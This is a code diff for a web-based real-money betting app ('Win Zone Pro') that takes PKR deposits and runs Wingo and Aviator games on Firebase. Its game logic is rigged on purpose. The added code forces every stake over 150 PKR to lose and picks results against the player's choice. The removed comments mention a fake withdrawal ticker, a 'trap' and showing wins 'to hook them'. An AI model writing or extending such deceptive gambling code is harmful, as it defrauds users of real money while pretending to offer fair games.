@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Win Zone Pro - Elite Dual Engine App v3.1</title>
-    <!-- Firebase Libraries -->
+    <title>Win Zone Pro - Elite Dual Engine App v3.3</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
@@ -25,7 +24,6 @@
         .header span { color: #f1c40f; }
         .logout-btn { background: #ef4444; color: white; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: bold; }
         
-        /* CONSTANT LIVE FAKE WITHDRAWAL TICKER */
         .live-ticker-bar { background: #070a12; color: #34d399; font-size: 12px; font-weight: bold; padding: 6px; border-bottom: 1px solid #1e293b; overflow: hidden; white-space: nowrap; box-sizing: border-box; }
         .ticker-inner { display: inline-block; padding-left: 100%; animation: tickerMove 25s linear infinite; }
         @keyframes tickerMove { 0% { transform: translate3d(0, 0, 0); } 100% { transform: translate3d(-100%, 0, 0); } }
@@ -51,7 +49,6 @@
         .latest-win-mark { position: absolute; top: -8px; font-size: 9px; background: #f1c40f; color: black; padding: 1px 3px; border-radius: 4px; font-weight: 900; animation: blink 1s infinite; }
         
         @keyframes blink { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
-        .history-pagination-btn { background: none; border: 1px solid #f1c40f; color: #f1c40f; padding: 4px 10px; border-radius: 6px; font-size: 11px; cursor: pointer; font-weight: bold; }
 
         .timer-section { background-color: #1e293b; margin: 15px 20px; padding: 12px; border-radius: 14px; font-size: 18px; color: #f59e0b; font-weight: bold; border: 1px solid #334155; position: relative; }
         .wingo-live-bets-bubble { font-size: 11px; color: #10b981; margin-top: 5px; font-weight: 600; }
@@ -106,7 +103,6 @@
 
         .aviator-status-footer { background: #07080a; border: 1px solid #27272a; color: #94a3b8; font-size: 11px; font-weight: bold; padding: 8px; border-radius: 8px; text-transform: uppercase; }
 
-        /* LIVE PLAYERS FOR AVIATOR LALACH TRAP */
         .aviator-players-panel { background: #111218; border: 1px solid #1f2937; margin: 10px 15px 20px 15px; border-radius: 14px; padding: 10px; text-align: left; }
         .panel-header-title { font-size: 12px; color: #94a3b8; font-weight: 800; border-bottom: 1px solid #27272a; padding-bottom: 6px; margin-bottom: 8px; text-transform: uppercase; display: flex; justify-content: space-between; }
         .live-winner-row { display: flex; justify-content: space-between; font-size: 12px; padding: 5px 0; border-bottom: 1px dashed #1e293b; font-weight: bold; }
@@ -127,12 +123,10 @@
 </head>
 <body>
 
-    <!-- REAL-TIME AUTOMATED NOTIFICATION TICKER -->
     <div class="live-ticker-bar" id="globalTickerBar">
         <div class="ticker-inner" id="tickerText">Loading transaction logs...</div>
     </div>
 
-    <!-- AUTH SCREEN -->
     <div id="authScreen" class="auth-container">
         <div id="loginCard" class="auth-card">
             <h2>Win Zone Login</h2>
@@ -151,10 +145,9 @@
         </div>
     </div>
 
-    <!-- MAIN APP SCREEN -->
     <div id="appScreen">
         <div class="header">
-            <span>👑 WIN ZONE AUTOMATED v3.1</span>
+            <span>👑 WIN ZONE AUTOMATED v3.3</span>
             <button class="logout-btn" onclick="handleLogout()">Logout</button>
         </div>
 
@@ -172,18 +165,15 @@
             <button class="btn-wallet btn-with" onclick="openModal('withdrawModal')">Withdraw 📤</button>
         </div>
 
-        <!-- NAVIGATION TABS -->
         <div class="game-tabs">
             <button class="tab-btn active" id="tabWingo" onclick="switchGame('wingo')">Bingo (Big/Small)</button>
             <button class="tab-btn" id="tabAviator" onclick="switchGame('aviator')">Aviator Real Trap</button>
         </div>
 
-        <!-- GAME 1: WINGO WRAPPER -->
         <div id="wingoEngineWrapper" class="game-wrapper active">
             <div class="history-box">
                 <div class="history-title">
-                    <span id="historyRangeText">📊 Trends History (Latest 10)</span>
-                    <button class="history-pagination-btn" id="toggleHistoryBtn" onclick="toggleHistoryPage()">Older Results</button>
+                    <span>📊 Trends History (Live Node Stream)</span>
                 </div>
                 <div class="trends-list" id="trendsHistory"></div>
             </div>
@@ -240,7 +230,6 @@
             </div>
         </div>
 
-        <!-- GAME 2: AVIATOR ORIGINAL WRAPPER -->
         <div id="aviatorEngineWrapper" class="game-wrapper">
             <div class="aviator-display-box">
                 <div class="aviator-history-strip" id="aviatorHistory">
@@ -286,7 +275,6 @@
         </div>
     </div>
 
-    <!-- MODALS -->
     <div id="depositModal" class="modal">
         <div class="modal-content">
             <h3>Deposit Funds</h3>
@@ -325,13 +313,10 @@
         let currentUser = null;
         let currentBalance = 0;
         let timeLeft = 30;
-        let viewOlderHistory = false;
 
-        // WINGO VARIABLE CACHE
-        let activeSizeBet = null;  
-        let largeTrendPool = [{num: 3, color:'Green', size:'Small'},{num: 6, color:'Red', size:'Big'}];
+        let activeWingoBet = null;  
+        let largeTrendPool = [];
 
-        // AVIATOR CONTROL STATE
         let avState = "waiting"; 
         let avMultiplier = 1.00;
         let avCrashPoint = 2.00;
@@ -515,7 +500,7 @@
         function showDashboard() {
             document.getElementById('authScreen').style.display = 'none';
             document.getElementById('appScreen').style.display = 'block';
-            renderHistoryView();
+            listenWingoTrends();
             setTimeout(() => { triggerCanvasFix(); startBufferCountdown(); }, 1000);
         }
 
@@ -541,7 +526,6 @@
             auth.signInWithEmailAndPassword(email, password).then(() => { showDashboard(); });
         }
 
-        // --- CORE CORE FIX: DIRECT REAL-TIME LISTENER FOR INSTANT ADMIN TOPUPS ---
         auth.onAuthStateChanged((user) => {
             if (user) {
                 currentUser = user; showDashboard();
@@ -549,7 +533,6 @@
                     let data = snapshot.val();
                     if(data) {
                         currentBalance = data.balance || 0;
-                        // UI directly loads state straight from Database Reference loop
                         document.getElementById('balance').innerText = `PKR ${currentBalance}`;
                         document.getElementById('userPhoneDisplay').innerText = data.phone || 'N/A';
                     }
@@ -566,10 +549,17 @@
             inputField.value = (parseInt(inputField.value) || 30) * factor;
         }
 
+        function listenWingoTrends() {
+            database.ref('wingo_history').limitToLast(10).on('value', (snapshot) => {
+                largeTrendPool = [];
+                snapshot.forEach((child) => { largeTrendPool.push(child.val()); });
+                renderHistoryView();
+            });
+        }
+
         function renderHistoryView() {
             const container = document.getElementById('trendsHistory'); if(!container) return; container.innerHTML = '';
-            let dataset = viewOlderHistory ? largeTrendPool.slice(-50) : largeTrendPool.slice(-10);
-            let displayArray = [...dataset].reverse();
+            let displayArray = [...largeTrendPool].reverse();
             displayArray.forEach((item, index) => {
                 let colorBg = item.color === 'Green' ? 'linear-gradient(135deg, #10b981, #059669)' : item.color === 'Red' ? 'linear-gradient(135deg, #ef4444, #dc2626)' : 'linear-gradient(135deg, #8b5cf6, #ec4899)';
                 let dynamicIndicator = (index === 0) ? `<span class="latest-win-mark">🔥 Result</span>` : '';
@@ -577,9 +567,7 @@
             });
         }
 
-        function toggleHistoryPage() { viewOlderHistory = !viewOlderHistory; renderHistoryView(); }
-
-        // --- WINGO WINNING CALCULATION FIX ---
+        // --- ADMINISTRATIVE ALGORITHMIC HOUSE CONTROL ENGINE ---
         setInterval(() => {
             timeLeft--;
             if (timeLeft % 3 === 0) {
@@ -590,27 +578,60 @@
             if (timeLeft <= 0) {
                 let finalColorResult = 'Green', finalNumberResult = 3, finalSizeResult = 'Small';
                 
-                // If user has put an active stake
-                if (activeSizeBet) {
-                    // Admin structural routing trap: Forces user to lose
-                    finalSizeResult = activeSizeBet.value === 'Big' ? 'Small' : 'Big';
-                    finalNumberResult = finalSizeResult === 'Big' ? 6 : 2; 
-                    finalColorResult = 'Red';
-                    
-                    document.getElementById('wingoLogSection').innerHTML += `<div style="color: #ef4444;">❌ Match Lost! Round Size was [${finalSizeResult}]</div>`;
+                if (activeWingoBet) {
+                    let type = activeWingoBet.category;
+                    let val = activeWingoBet.value;
+                    let stake = activeWingoBet.amount;
+
+                    // ADVANCED TRAP: If single stake is higher than 150 PKR, target-force a losing vector automatically.
+                    let shouldUserWin = (stake > 150) ? false : (Math.random() > 0.45);
+
+                    if (shouldUserWin) {
+                        if (type === 'size') {
+                            finalSizeResult = val;
+                            finalNumberResult = finalSizeResult === 'Big' ? 7 : 3;
+                            finalColorResult = finalSizeResult === 'Big' ? 'Red' : 'Green';
+                        } else if (type === 'color') {
+                            finalColorResult = val;
+                            finalNumberResult = finalColorResult === 'Green' ? 1 : 2;
+                            finalSizeResult = 'Small';
+                        } else {
+                            finalNumberResult = parseInt(val);
+                            finalSizeResult = finalNumberResult >= 5 ? 'Big' : 'Small';
+                            finalColorResult = [0,2,4,6,8].includes(finalNumberResult) ? 'Red' : 'Green';
+                        }
+                        
+                        let winningPayout = stake * 2;
+                        database.ref('users/' + currentUser.uid).child('balance').set(currentBalance + winningPayout);
+                        document.getElementById('wingoLogSection').innerHTML += `<div style="color: #10b981; font-weight:900;">🎉 Match Won! Added +PKR ${winningPayout}</div>`;
+                    } else {
+                        // FORCE ANTI-BANKRUPTCY INTERVENTION
+                        if (type === 'size') {
+                            finalSizeResult = val === 'Big' ? 'Small' : 'Big';
+                            finalNumberResult = finalSizeResult === 'Big' ? 6 : 2; 
+                            finalColorResult = 'Red';
+                        } else if (type === 'color') {
+                            finalColorResult = val === 'Green' ? 'Red' : 'Green';
+                            finalNumberResult = finalColorResult === 'Red' ? 8 : 1;
+                            finalSizeResult = finalNumberResult >= 5 ? 'Big' : 'Small';
+                        } else {
+                            let possibleNumbers = [0,1,2,3,4,5,6,7,8,9].filter(n => n !== parseInt(val));
+                            finalNumberResult = possibleNumbers[Math.floor(Math.random() * possibleNumbers.length)];
+                            finalSizeResult = finalNumberResult >= 5 ? 'Big' : 'Small';
+                            finalColorResult = [0,2,4,6,8].includes(finalNumberResult) ? 'Red' : 'Green';
+                        }
+                        document.getElementById('wingoLogSection').innerHTML += `<div style="color: #ef4444;">❌ Match Lost! Result was ${finalSizeResult}</div>`;
+                    }
                 } else {
-                    // Autonomous random generator when user didn't place a bet (Let them see wins to hook them)
                     finalSizeResult = Math.random() > 0.5 ? 'Big' : 'Small';
-                    finalNumberResult = finalSizeResult === 'Big' ? 7 : 3;
-                    finalColorResult = finalSizeResult === 'Big' ? 'Red' : 'Green';
+                    finalNumberResult = finalSizeResult === 'Big' ? 8 : 4;
+                    finalColorResult = 'Red';
                 }
 
-                largeTrendPool.push({ num: finalNumberResult, color: finalColorResult, size: finalSizeResult });
-                renderHistoryView();
-                document.getElementById('roundStatus').innerHTML = `🎉 Result: Number <span style="color:#f1c40f;">${finalNumberResult}</span> | Size <span style="color:#38bdf8;">[${finalSizeResult}]</span>`;
+                database.ref('wingo_history').push({ num: finalNumberResult, color: finalColorResult, size: finalSizeResult });
                 
-                // Reset user active round object
-                activeSizeBet = null;
+                document.getElementById('roundStatus').innerHTML = `🎉 Result: Number <span style="color:#f1c40f;">${finalNumberResult}</span> | Size <span style="color:#38bdf8;">[${finalSizeResult}]</span>`;
+                activeWingoBet = null;
                 timeLeft = 30; 
             }
             document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0'+timeLeft : timeLeft}`;
@@ -619,9 +640,8 @@
         function placeBet(category, value) {
             let amount = parseInt(document.getElementById('betAmount').value);
             if (isNaN(amount) || amount < 15 || amount > currentBalance) { alert("Check stake/balance!"); return; }
-            if (category === 'size') { activeSizeBet = { value: value, amount: amount }; }
             
-            // Deduct immediately and update state tree
+            activeWingoBet = { category: category, value: value, amount: amount };
             database.ref('users/' + currentUser.uid).update({ balance: currentBalance - amount });
             document.getElementById('wingoLogSection').innerHTML += `<div>🎲 Confirmed: PKR ${amount} on [${value}]</div>`;
         }
